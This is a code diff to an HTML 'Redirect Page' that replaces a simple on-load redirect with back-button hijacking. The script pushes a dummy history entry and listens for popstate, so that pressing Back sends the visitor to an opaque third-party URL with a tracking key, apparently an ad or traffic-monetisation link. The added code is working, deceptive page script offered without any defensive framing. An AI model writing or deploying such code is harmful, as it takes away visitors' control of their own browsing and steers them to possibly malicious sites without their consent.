@@ -5,10 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirect Page</title>
     <script type="text/javascript">
-        // Redirect after page loads
-        window.onload = function() {
+        // Function to handle the back button
+        function handleBackButton() {
+            // Redirect when the back button is pressed
             window.location.href = "https://twirlparchextent.com/t5t3vttb?key=f24345116e0a3c3d63cb88c4b1061844";
         }
+
+        // Detect back-button press using popstate event
+        window.onpopstate = function(event) {
+            handleBackButton();
+        };
+
+        // Push a new state to history to intercept the back button
+        history.pushState(null, null, location.href);
     </script>
 </head>
 <body>
